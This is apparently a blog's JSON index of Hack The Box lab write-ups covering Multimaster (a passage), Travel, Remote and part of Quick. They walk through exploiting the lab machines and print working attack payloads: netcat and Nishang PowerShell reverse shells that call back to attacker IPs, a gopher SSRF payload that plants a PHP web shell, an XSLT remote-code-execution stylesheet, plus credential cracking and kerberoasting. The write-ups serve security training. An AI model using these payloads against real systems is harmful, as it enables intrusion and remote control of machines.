Powershell but my user didn’t have sufficient privileges.Phra from the Donkeys HTB team has a blog post about CVE-2019-1414 which lets users get local execution by using the debug port on the VS Code Node.js server.In a nutshell, the debug port is bound to random TCP port everytime the application starts. Since I already had a shell on the machine I could watch the output of the netstat command and see what port is currently in use.I won’t paste the entire nodejs PoC since it’s already in the blog post but I did change the spawnSync arguments since the PoC was using using bash and Multimaster is a Windows box. It took me a while to figure out that forward slashes were required. I didn’t want to get bogged down in bypassing AV or AMSI so I just called netcat that I had uploaded onto the box.socket.send(JSON.stringify({      id: 3,      method: 'Runtime.evaluate',      params: {        expression: `spawnSync('/programdata/nc.exe', ['-e', 'cmd.exe', '10.10.14.30', '80'])`      }    }))To upload file with WinRM on Windows you can do the following:$sess = new-pssession multimaster.megacorp.localcopy-item -path nc.exe -destination c:\\programdata\\nc.exe -tosession $sessBecause the port was only listening on localhost, I had to get some port-forwarding going. I could have used a Meterpreter shell but instead opted for chisel in SOCKS proxy mode.Using proxychains, I launched the exploit and got a revere shell as user cyorkPriv esc from cyork to sbauerThat part took a bit of time, I looked around the file system and the only different thing with cyork is he’s a member of the Developers group. I couldn’t access anything else until I noticed I had access to the web server .dll file used by the web application. I poked inside and saw that the database finder user credentials were hardcoded inside C:\\inetpub\\wwwroot\\bin\\MultimasterAPI.dllI sprayed that password across all the accounts and found a match for sbauer:D3veL0pM3nT!Priv esc from sbauer to jordenUsing Powerview, I checked the ACL’s and saw an interesting entry:sbauer has GenericWrite privileges on jorden which means we can change some his attributes like logon script, etc. An interesting technique here is we can add an SPN to the account then kerberoast it.Ref: Targeted KerberoastingSo I just had to add an SPN to jorden then was able to kerberoast his account.I was able to crack the hash with John The Ripper: rainforest786I logged back into my Windows VM with the jorden user account and confirmed I was able to access the server through WinRM.Getting the root flagUser jorden is a member of the Server Operators group, which gives him the SeBackupPrivilege and SeRestorePrivilege rights.In a nutshell, using the backup privileges, we can view/change any files on the system. Here because I was pressed for time trying to get first blood on the system I opted to read the flag file directly instead of trying to land a shell as administrator.I used the following github PoC to read the file.Ref: https://github.com/giuliano108/SeBackupPrivilege"
  },
  
  {
    "title": "Travel - Hack The Box",
    "url": "/posts/htb-writeup-travel/",
    "categories": "hackthebox, infosec",
    "tags": "vhosts, php, git, memcache, ssrf, gopher, deserialization, ldap, viminfo, nss",
    "date": "2020-09-05 00:00:00 +0800",
    





    
    "snippet": "Travel is an awesome box from my ATeam teammates xct and jkr. The box has a code review part where we analyze the source code of a PHP web app to find a command injection vulnerability in a curl co...",
    "content": "Travel is an awesome box from my ATeam teammates xct and jkr. The box has a code review part where we analyze the source code of a PHP web app to find a command injection vulnerability in a curl command. We then use the Gopher protocol to perform SSRF and write a serialized PHP payload into the memcache database. For the priv esc part, we manipulate attributes of a user in an LDAP database which is used by the NSS facility to extend the Linux authentication database.Portscansnowscan@kali:~/htb/travel$ sudo nmap -sC -sV -p- 10.10.10.189Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-19 20:14 EDTNmap scan report for travel.htb (10.10.10.189)Host is up (0.018s latency).Not shown: 65532 closed portsPORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)80/tcp  open  http     nginx 1.17.6|_http-server-header: nginx/1.17.6|_http-title: Travel.HTB443/tcp open  ssl/http nginx 1.17.6|_http-server-header: nginx/1.17.6|_http-title: Travel.HTB - SSL coming soon.| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb| Not valid before: 2020-04-23T19:24:29|_Not valid after:  2030-04-21T19:24:29Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.95 secondsWe can see 3 vhosts in the TLS certificate:  www.travel.htb  blog.travel.htb  blog-dev.travel.htb1st website - www.travel.htbThere’s nothing interesting on the main web page: it’s just a static webpage with a non-functional susbcription form at the bottom. The other vhosts we found when running the nmap scan are probably where we want to go look next.2nd website - blog.travel.htbThe blog page runs a Wordpress instance and the main page contains a hint about a new RSS feature being released soon from the dev team. This is probably what we will want to look at next.We can run wpscan to check for low hanging fruits like configuration backups and so on but we don’t find anything interesting.  There’s only a single administrator account and because this is a Hard box, there isn’t any brute-forcing involved.3nd website - blog-dev.travel.htbWe don’t have access to the blog-dev page because there’s probably an .htaccess config file in there to prevent directory indexing.Just because directory indexing is disabled doesn’t mean we can’t look for other stuff that may be hidden. We’ll use ffuf to fuzz files and directories and we find a Git repository.snowscan@kali:~/htb/travel$ ffuf -t 50 -w $WLRC -u http://blog-dev.travel.htb/FUZZ        /'___\\  /'___\\           /'___\\       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\          \\/_/    \\/_/   \\/___/    \\/_/       v1.1.0-git________________________________________________ :: Method           : GET :: URL              : http://blog-dev.travel.htb/FUZZ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 50 :: Matcher          : Response status: 200,204,301,302,307,401,403________________________________________________.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]Dumping the Git repo filesUsing git-dumper, we can can download the entire Git repository:snowscan@kali:~/htb/travel/tmp$ ~/tools/git-dumper/git-dumper.py http://blog-dev.travel.htb .[-] Testing http://blog-dev.travel.htb/.git/HEAD [200][-] Testing http://blog-dev.travel.htb/.git/ [403][-] Fetching common files[-] Fetching http://blog-dev.travel.htb/.gitignore [404][-] Fetching http://blog-dev.travel.htb/.git/COMMIT_EDITMSG [200][-] Fetching http://blog-dev.travel.htb/.git/description [200][-] Fetching http://blog-dev.travel.htb/.git/hooks/applypatch-msg.sample [200][-] Fetching http://blog-dev.travel.htb/.git/hooks/post-commit.sample [404][-] Fetching http://blog-dev.travel.htb/.git/hooks/commit-msg.sample [200][-] Fetching http://blog-dev.travel.htb/.git/hooks/pre-applypatch.sample [200][-] Fetching http://blog-dev.travel.htb/.git/hooks/post-receive.sample [404]First glance at the PHP source codeThere’s only one commit in the repo so we won’t have to look for leftover credentials that were removed by a second commit or anything like that.The repo contains three files:  rss_template.php  template.php  README.mdWe’ll start by reading the instructions in the readme file to understand what this repo contains:# Rss Template ExtensionAllows rss-feeds to be shown on a custom wordpress page.## Setup* `git clone https://github.com/WordPress/WordPress.git`* copy rss_template.php &amp; template.php to `wp-content/themes/twentytwenty`* create logs directory in `wp-content/themes/twentytwenty`* create page in backend and choose rss_template.php as theme## Changelog- temporarily disabled cache compression- added additional security checks- added caching- added rss templateThe readme tells us there’s a custom RSS feed PHP application in wp-content/themes/twentytwenty along with the log directory location. It also mentions that caching has been added. This is interesting because this could mean we have to interact with redis or memcache later.rss_template is the main PHP code and contains a couple of interesting parts:  It’s using memcache to store the generated content for up to 60 seconds and it uses _xct as the prefix for the key.    $data = url_get_contents($url);  if ($url) {      $simplepie = new SimplePie();      $simplepie-&gt;set_cache_location('memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_');      //$simplepie-&gt;set_raw_data($data);      $simplepie-&gt;set_feed_url($url);      $simplepie-&gt;init();      $simplepie-&gt;handle_content_type();        The URL of the custom feed is passed through the custom_feed_url parameter.    $url = $_SERVER['QUERY_STRING'];if(strpos($url, \"custom_feed_url\") !== false){$tmp = (explode(\"=\", $url)); \t$url = end($tmp); \t} else {$url = \"http://www.travel.htb/newsfeed/customfeed.xml\";}        There’s a debug.php script that can be enabled by setting the debug parameter in the GET request    &lt;!--DEBUG&lt;?phpif (isset($_GET['debug'])){  include('debug.php');}?&gt;--&gt;      The other file, template.php contains a function that filters the custom_feed_url parameter in an attempt to prevent SSRF’s and local file inclusion attacks. The filter is easily bypassed by using the 0 IP address value instead of 127.0.0.1 to reach localhost.function safe($url){\t// this should be secure\t$tmpUrl = urldecode($url);\tif(strpos($tmpUrl, \"file://\") !== false or strpos($tmpUrl, \"@\") !== false)\t{\t\t\t\tdie(\"&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;\");\t}\tif(strpos($tmpUrl, \"-o\") !== false or strpos($tmpUrl, \"-F\") !== false)\t{\t\t\t\tdie(\"&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;\");\t}\t$tmp = parse_url($url, PHP_URL_HOST);\t// preventing all localhost access\tif($tmp == \"localhost\" or $tmp == \"127.0.0.1\")\t{\t\t\t\tdie(\"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;\");\t\t\t}\treturn $url;}Next, there’s the actual function that is used by the custom RSS extension to retrieve the XML content of the feed. Note that it uses curl so there’s a big risk of command injection if  the parameters are not sufficiently sanitized.function url_get_contents ($url) {    $url = safe($url);\t$url = escapeshellarg($url);\t$pl = \"curl \".$url;\t$output = shell_exec($pl);    return $output;}Finally, there’s the TemplateHelper class that is used to log data into the /logs  sub-directory. This TemplateHelper isn’t used by the code at the moment but we could still use the init function called by the class constructor in a deserialization attack if we are able to pass a serialized object to the web application.Using the SSRF to inject into memcacheWhen we click the Awesome RSS link at the top right we get the posts displayed from the customfeed.xml file hardcoded in the application since we didn’t specify any custom URL.When we specfiy the feed URL with http://blog.travel.htb/awesome-rss/?debug=1&amp;custom_feed_url=http:/10.10.14.33/customfeed.xml the XML from our server is retrieved and displayed.In the source code, we see that there are HTML comments that are added, presumably by the debug.php file that we enabled by adding the debug parameter in the query. The output shows a PHP serialized object along with the key name. The output is cropped so we don’t see the full content of the key/value pair.It’s possible to smuggle requests to the memcache backend service through the custom_url_feed parameter that gets processed by the curl command. As we saw earlier, there’s some anti-SSRF filtering but it’s pretty weak and easily bypassed by using a 0 instead of localhost or 127.0.0.1. To send precise memcache commands to the server, we can use the Gopher protocol URI handler and the Gopherus utility that’ll encode our payload in the right format.First we’ll do a test and create a simple key/value pair in the memcache instance. Gopherus automatically uses SpyD3r as the key name, something we’ll need to change later. Also, I’m not using a properly serialized payload for the first test, this is just to see if we’ll be able to write to memcache.We’ll test locally on a netcat listener to see if it sends the payload correctly. Here we see that it correctly sends the command to set the SpyD3r key and passed the CR and LF.We’re ready to test on the actual server, we’ll use the same payload and send it with Burp. We do need to change the 127.0.0.1 to 0 to avoid getting caught by the filter.Then when we check the content of the memcache through the debug.php script we can see that our content has successfully been been injected.Finding the correct encoding for the key nameBefore we can move on to the PHP deserialization attack we have to find the correct key name that will be deserialized when we visit the RSS page with the custom_feed_url parameter. As we find during experimentation with Burp, the key name depends on the URI passed to the custom_feed_url parameter. The content of the XML file does not affect the key name which is generated.For this next part we have to look at Wordpress’s source code and Simplepie’s source code to figure out how the key is constructed.  https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php  https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Memcache.php  https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie/Cache/Base.phpThe key name is constructed like this: md5(md5($name)+\":\"+\"spc\")We can test this theory by computing the name and checking to see if it matches the first part of the key which is visible from the memcache debug info.Good, so the key matches what we saw earlier. We’ll need to use xct_0375e1e45d8573844bcfb43ffe0ca90a instead of the default value provided by Gopherus after we do the next part: serializing a payload that’ll let us write a PHP command shell.PHP deserialization attackAs we saw in the source code and from the memcache dump, the content of the XML file gets converted to a PHP object, serialized then stored into the memcache database if the cache entry doesn’t exist or has expired. When the next user visits the page to view the content, the values are pulled from the memcache and the object is deserialized. This is where we come in, we’ll use the TemplateHelper class to write a PHP command shell into the logs directory.We copy the class to another PHP file and add a line that creates the object, passing the filename and content as parameters then echo the output so we can use with Gopherus.Note: It is also important to change the $file and $data variables to private otherwise they won’t be included in the output.&lt;?phpclass TemplateHelper{    private $file;    private $data;    public function __construct(string $file, string $data)    {        $this-&gt;init($file, $data);    }    public function __wakeup()    {        $this-&gt;init($this-&gt;file, $this-&gt;data);    }    private function init(string $file, string $data)    {                $this-&gt;file = $file;        $this-&gt;data = $data;        file_put_contents(__DIR__.'/logs/'.$this-&gt;file, $this-&gt;data);    }}###### The part below has been added###$user = new TemplateHelper('snow.php', '&lt;?php system($_REQUEST[\"c\"]); ?&gt;');echo serialize($user);?&gt;When running the script, we get the serialized output:snowscan@kali:~/htb/travel$ php exploit.phpPHP Warning:  file_put_contents(/home/snowscan/htb/travel/logs/snow.php): failed to open stream: No such file or directory in /home/snowscan/htb/travel/exploit.php on line 23O:14:\"TemplateHelper\":2:{s:4:\"file\";s:8:\"snow.php\";s:4:\"data\";s:32:\"&lt;?php system($_REQUEST[\"c\"]); ?&gt;\";}Reverse shellSo we’ll go back to Gopherus with the PHP payload and get the payload for the memcache injection.After changing the key for the correct value and replacing 127.0.0.1 by 0 we get the following payload:gopher://0:11211/_%0d%0aset%20xct_0375e1e45d8573844bcfb43ffe0ca90a%204%200%20103%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:8:%22snow.php%22%3Bs:4:%22data%22%3Bs:32:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22c%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0aWe’re ready to rock &amp; roll now, first we populate the memcache with the payload:Then we go to http://blog.travel.htb/awesome-rss/?debug=1&amp;custom_feed_url=http://10.10.14.33/customfeed.xml to trigger the deserialization.And finally we test and see that our command shell has successfully been written. We have RCE.We’ll get a reverse shell with netcat.EnumerationWe got a shell but we’re still running as www-data and haven’t found the user flag yet. After looking around the box we find a backup of the wordpress instance in the /opt directory.The database backup contains the hashed values for the users.The password for the lynik-admin user is cracked with john.We can now log in with SSH to the box and get the user flag.LDAP reconThe machine is running a container for the wordpress instance we saw earlier but there’s also another container running an LDAP server as indicated in the host file.We can query the server with ldapsearch but we don’t have credentials so it returns no objects.In the home directory, the .viminfo file contains a password.We’re now able to pull a list of users from the LDAP server:This machine has a special NSS configuration that uses the LDAP server to fetch additional user information.We can see the effective user list with the getent command:LDAP users attribute modificationWe can probably modify the users attributes in the LDAP since our user is an LDAP administrator. The user records look like this:dn: uid=gloria,ou=users,ou=linux,ou=servers,dc=travel,dc=htbuid: gloriauidNumber: 5010homeDirectory: /home/gloriagivenName: GloriagidNumber: 5000sn: Woodcn: Gloria WoodobjectClass: topobjectClass: personobjectClass: organizationalPersonobjectClass: inetOrgPersonobjectClass: posixAccountobjectClass: shadowAccountloginShell: /bin/bashI tried changing the uid by renaming the user but we don’t have access to do that. To make changes we can use LDIF files or use a tool like Apache Directory Studio.I’ll reconnect my SSH and enable port-forward so I can reach the LDAP server directory from my machine: sudo ssh -L 389:172.20.0.10:389 lynik-admin@10.10.10.189First, we’ll set the user’s password to welcome123.Then we’ll change the Group ID to 27 (sudo) so our user will be able to become root once we have a shell.To add an SSH public key, we need to add the ldapPublicKey object class first.Then we can add the sshPublic attribute and put our SSH key there.Last step to rootNow we can SSH to the server using RSA authentication then use the sudo command with the welcome123 password we set earlier in the LDAP server."
  },
  
  {
    "title": "Remote - Hack The Box",
    "url": "/posts/htb-writeup-remote/",
    "categories": "hackthebox, infosec",
    "tags": "nfs, umbraco, teamviewer, metasploit",
    "date": "2020-09-05 00:00:00 +0800",
    





    
    "snippet": "Remote is a beginner’s box running a vulnerable version of the Umbraco CMS which can be exploited after we find the credentials from an exposed share. After landing a reverse shell, we find that th...",
    "content": "Remote is a beginner’s box running a vulnerable version of the Umbraco CMS which can be exploited after we find the credentials from an exposed share. After landing a reverse shell, we find that the machine has TeamViewer installed and we can recover the password with Metasploit then log in as Administrator.Summary  Find open NFS share and locate Umbraco credentials inside the SDF file  Use Umbraco exploit with the admin credentials to get a shell  Find TeamViewer’s credentials using Metasploit  Log in as administrator with the password from TeamViewerPortscanroot@kali:~/htb/remote# nmap -sC -sV -p- 10.10.10.180Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-21 19:41 EDTNmap scan report for remote.htb (10.10.10.180)Host is up (0.063s latency).Not shown: 65518 closed portsPORT      STATE SERVICE       VERSION21/tcp    open  ftp           Microsoft ftpd|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: |_  SYST: Windows_NT80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Home - Acme Widgets111/tcp   open  rpcbind       2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service[...]135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn445/tcp   open  microsoft-ds?2049/tcp  open  mountd        1-3 (RPC #100005)5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found[...]Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsUsing crackmapexec, we can identity the OS and the domain name.root@kali:~/htb/remote# cme smb 10.10.10.180SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:REMOTE) (signing:False) (SMBv1:False)Unsuccessful recon  FTP site allows anonymous connections but doesn’t contain anything  Null sessions are not allowed on the box (can’t enumerate users or shares)WebsiteThe site is just some company’s website and doesn’t have anything interesting.We can see from the various left around the page and html source code that it’s running the Umbraco CMS.We can access the login page at http://remote.htb/umbraco/ but we don’t have any credentials yet.NFS mountUsing showmount we can check which NFS shares are accessible. Here we can see that site_backups is accessible by anyone.root@kali:~# showmount -e 10.10.10.180Export list for 10.10.10.180:/site_backups (everyone)We can mount the NFS share to our /mnt directory and examine the files contained within.root@kali:~# mount -t nfs 10.10.10.180:site_backups /mntroot@kali:~# ls -l /mnttotal 115drwx------ 2 nobody 4294967294    64 Feb 20 12:16 App_Browsersdrwx------ 2 nobody 4294967294  4096 Feb 20 12:17 App_Datadrwx------ 2 nobody 4294967294  4096 Feb 20 12:16 App_Pluginsdrwx------ 2 nobody 4294967294    64 Feb 20 12:16 aspnet_clientdrwx------ 2 nobody 4294967294 49152 Feb 20 12:16 bindrwx------ 2 nobody 4294967294  8192 Feb 20 12:16 Configdrwx------ 2 nobody 4294967294    64 Feb 20 12:16 css-rwx------ 1 nobody 4294967294   152 Nov  1  2018 default.aspx-rwx------ 1 nobody 4294967294    89 Nov  1  2018 Global.asaxdrwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Mediadrwx------ 2 nobody 4294967294    64 Feb 20 12:16 scriptsdrwx------ 2 nobody 4294967294  8192 Feb 20 12:16 Umbracodrwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Umbraco_Clientdrwx------ 2 nobody 4294967294  4096 Feb 20 12:16 Views-rwx------ 1 nobody 4294967294 28539 Feb 20 00:57 Web.configLocating the umbraco admin passwordI expected the password to be inside Web.config or some other plaintext configuration file but I did not find any credentials there. However when I looked at the Umbraco.sdf file in the /mnt/App_Data folder I saw that it contains some hashed passwords.The administrator’s SHA-1 hash looks interesting: b8be16afba8c314ad33d812f22a04991b90e2aaaIt’s easily cracked with john: baconandcheeseNow we can log in to the Umbraco page:Getting a shell with umbraco exploitA quick search on Exploit-DB shows there’s an authenticated exploit for Umbraco version 7.12.4, which is the exact version running on the box.Here’s the modified exploit with the proper credentials and the payload using powershell.exe to reach out to our python webserver and download a powershell payload.The payload is a standard Nishang reverse TCP shell:$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()After using the expoit, we can get a shell.PrivescI noticed that the TeamViewer service is running on the server.We can find the TeamViewer credentials by using the Metasploit module.Then we can log in to the box as administrator using WinRM."
  },
  
  {
    "title": "Quick - Hack The Box",
    "url": "/posts/htb-writeup-quick/",
    "categories": "hackthebox, infosec",
    "tags": "quic, php, esi, xslt, port forward, mysql, race condition",
    "date": "2020-08-29 00:00:00 +0800",
    





    
    "snippet": "Quick was a hard box with multiple steps requiring the use of the QUIC protocol to access one section of the website and get the customer onboarding PDF with a set of default credentials. We get to...",
    "content": "Quick was a hard box with multiple steps requiring the use of the QUIC protocol to access one section of the website and get the customer onboarding PDF with a set of default credentials. We get to play with ESI template injection to get the initial shell, then abuse a race condition in a PHP script so we can pivot to another user then finally we priv esc to root by finding credentials in the printer configuration file.Summary  Enumerate client names and countries from the main website testimonials and client list  Locate ticketing system through dirbusting  Use QUIC protocol to access the User Portal on UDP port 443  Locate employees list &amp; PDF document containing default employee password  Guess the email address associated with the password based on previously obtained client &amp; country list  Exploit ESI Injection vulnerability in the ticketing system to get RCE  Locate print server running on localhost, log in after changing the password of the account in the MySQL database  Exploit race condition in PHP script responsible for print jobs and read &amp; write SSH keys for the srvadm user  Find the root password inside the printers.conf filePortscanroot@kali:~# nmap -sC -sV -p- 10.10.10.186Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 19:17 EDTNmap scan report for quick.htb (10.10.10.186)Host is up (0.020s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Quick | Broadband ServicesService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 115.39 secondsWebsite enumerationOn the website there’s a few tidbits of useful information such as:  Testimonials with persons names and company names (this will be useful later)  There’s a weird comment about using Mobile App to access the portalThe clients.php link provides a bigger list of clients with their country.With gobuster, we find a list of php files on the server.root@kali:~# gobuster dir -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x php -t 50 -u http://quick.htb:9001/clients.php (Status: 200)/db.php (Status: 200)/home.php (Status: 200)/index.php (Status: 200)/login.php (Status: 200)/search.php (Status: 200)/server-status (Status: 200)/ticket.php (Status: 200)The login.php file is a login page for the ticketing system. We’ll try a couple of default username/passwords but we aren’t able to log in.The other pages db.php, search.php, ticket.php can’t be accessed directly or require a valid session.Quick User portalBased on that interesting comment in the Update section of the main page and the name of the box, I thought about the QUIC protocol which runs on UDP instead of TCP. A quick port scan of the UDP ports on the box confirms that something is listening on port 443.root@kali:~# nmap -sU -F 10.10.10.186Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 19:30 EDTNmap scan report for quick.htb (10.10.10.186)Host is up (0.018s latency).Not shown: 99 closed portsPORT    STATE         SERVICE443/udp open|filtered httpsNmap done: 1 IP address (1 host up) scanned in 106.93 secondsI used the Quiche client from CloudFlare to do QUIC connections to the server. The client has to be compiled from source but the installation instructions on the site are self explanatory. After installing the client I can access the Quick User portal and I see links to Contact, About and References.root@kali:~# http3-client https://10.10.10.186&lt;html&gt;&lt;title&gt; Quick | Customer Portal&lt;/title&gt;&lt;h1&gt;Quick | Portal&lt;/h1&gt;[...]&lt;body&gt;&lt;p&gt; Welcome to Quick User Portal&lt;/p&gt;&lt;ul&gt;  &lt;li&gt;&lt;a href=\"index.php\"&gt;Home&lt;/a&gt;&lt;/li&gt;  &lt;li&gt;&lt;a href=\"index.php?view=contact\"&gt;Contact&lt;/a&gt;&lt;/li&gt;  &lt;li&gt;&lt;a href=\"index.php?view=about\"&gt;About&lt;/a&gt;&lt;/li&gt;  &lt;li&gt;&lt;a href=\"index.php?view=docs\"&gt;References&lt;/a&gt;&lt;/li&gt;The contact section has a form to send messages. I thought this could be a vector for an XSS but the form doesn’t appear to do anything when I issue a GET with the form parameters.&lt;div class=\"container\"&gt;  &lt;form action=\"/\"&gt;[...]    &lt;label for=\"subject\"&gt;Subject&lt;/label&gt;    &lt;textarea id=\"subject\" name=\"subject\" placeholder=\"Write something..\" style=\"height:200px\"&gt;&lt;/textarea&gt;    &lt;input type=\"submit\" value=\"Submit\"&gt;  &lt;/form&gt;&lt;/div&gt;The about section has a list of employee with their email addresses. These could be valid usernames so I make note of these for later.[...]        &lt;h2&gt;Jane Doe&lt;/h2&gt;        &lt;p class=\"title\"&gt;CEO &amp; Founder&lt;/p&gt;        &lt;p&gt;Quick Broadband services established in 2012 by Jane.&lt;/p&gt;        &lt;p&gt;jane@quick.htb&lt;/p&gt;[...]       &lt;h2&gt;Mike Ross&lt;/h2&gt;        &lt;p class=\"title\"&gt;Sales Manager&lt;/p&gt;        &lt;p&gt;Manages the sales and services.&lt;/p&gt;        &lt;p&gt;mike@quick.htb&lt;/p&gt;[...]        &lt;h2&gt;John Doe&lt;/h2&gt;        &lt;p class=\"title\"&gt;Web Designer&lt;/p&gt;        &lt;p&gt;Front end developer.&lt;/p&gt;        &lt;p&gt;john@quick.htb&lt;/p&gt;The references section contains two PDF documents.root@kali:~# http3-client https://10.10.10.186/index.php?view=docs[...]  &lt;li&gt;&lt;a href=\"docs/QuickStart.pdf\"&gt;Quick-Start Guide&lt;/a&gt;&lt;/li&gt;  &lt;li&gt;&lt;a href=\"docs/Connectivity.pdf\"&gt;Connectivity Guide&lt;/a&gt;&lt;/li&gt;The QuickStart.pdf file refers to that ticketing system we found earlier but for which we don’t have valid credentials.The  Connectivity.pdf file has the default password assigned to customers: Quick4cc3$$. This is probably the password used on the ticketing system but we don’t have the username to log in.Ticketing systemI went back to the Testimonials and client information we found earlier and tried different combination of domain names and TLDs. The country indicated in the client list is a hint that allows us to guess the TLD instead of fuzzing all possible TLDs.The correct credentials are: elisa@wink.co.uk / Quick4cc3$$The ticketing system contains two functions:  Raise a new ticket  Search for existing ticketA random ticket ID is generated each time we submit a new ticket.We can then search for our ticket and the content is returned.In the search.php response, we can see that the web application uses Esigate. This allows the application to modify the content of the page using special ESI tags.There’s a blog post that go over abusing specific implementations of ESI. In a nutshell, we can get RCE on the server by injecting XML Stylesheet Language Transformations (XSLT). The input on the ticket creation page is totally unfiltered so we can add ESI tags and they will be reflected back.A quick test shows that we can get a ping back to our webserver by using the following tag:To get a shell on the server, I’ll first create a shell.sh script that will execute a typical reverse shell payload:#!/bin/bashrm /tmp/yolo;mkfifo /tmp/yolo;cat /tmp/yolo|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 443 &gt;/tmp/yoloBy using the example in the blog post, I created the first XSLT file with the following payload to download my shell script  with wget.&lt;?xml version=\"1.0\" ?&gt;&lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt;&lt;xsl:output method=\"xml\" omit-xml-declaration=\"yes\"/&gt;&lt;xsl:template match=\"/\"xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"xmlns:rt=\"http://xml.apache.org/xalan/java/java.lang.Runtime\"&gt;&lt;root&gt;&lt;xsl:variable name=\"cmd\"&gt;&lt;![CDATA[wget 10.10.14.10/shell.sh]]&gt;&lt;/xsl:variable&gt;&lt;xsl:variable name=\"rtObj\" select=\"rt:getRuntime()\"/&gt;&lt;xsl:variable name=\"process\" select=\"rt:exec($rtObj, $cmd)\"/&gt;Process: &lt;xsl:value-of select=\"$process\"/&gt;Command: &lt;xsl:value-of select=\"$cmd\"/&gt;&lt;/root&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;Then I created a new ticket that links to the stylesheet esi.xsl I just created.After searching for the ticket number 7644, I saw the shell.sh file was downloaded from my machine.Then, I modified the esi.xsl file and changed the command to execute the shell.sh file and get a reverse shell.[...]&lt;xsl:variable name=\"cmd\"&gt;&lt;![CDATA[bash shell.sh]]&gt;&lt;/xsl:variable&gt;[...]After searching for that same ticket again, I got a connection back.$ cd /home/sam$ lsesigate-distribution-5.2shell.shuser.txt$ cat user.txt66246c9fe[...]I dropped my SSH public key to /home/sam/.ssh/authorized_keys so I could log in directly with a proper SSH shell.Privesc to user srvadmThe box has two users:  sam  srvadmsam@quick:~$ tail -n 5 /etc/passwdpollinate:x:109:1::/var/cache/pollinate:/bin/falsesshd:x:110:65534::/run/sshd:/usr/sbin/nologinsam:x:1000:1000:sam:/home/sam:/bin/bashmysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/falsesrvadm:x:1001:1001:,,,:/home/srvadm:/bin/bashsam@quick:~$ ls -l /hometotal 8drwxr-xr-x 7 sam    sam    4096 Apr 26 00:18 samdrwxr-xr-x 6 srvadm srvadm 4096 Mar 20 06:37 srvadmI looked at the Apache configuration file /etc/apache2/sites-enabled/000-default.conf and saw that there’s a website listing on port 80 with a different domain name: printerv2.quick.htb. The AssignUserId config statement indicated this server is running as the srvadm user.&lt;VirtualHost *:80&gt;\tAssignUserId srvadm 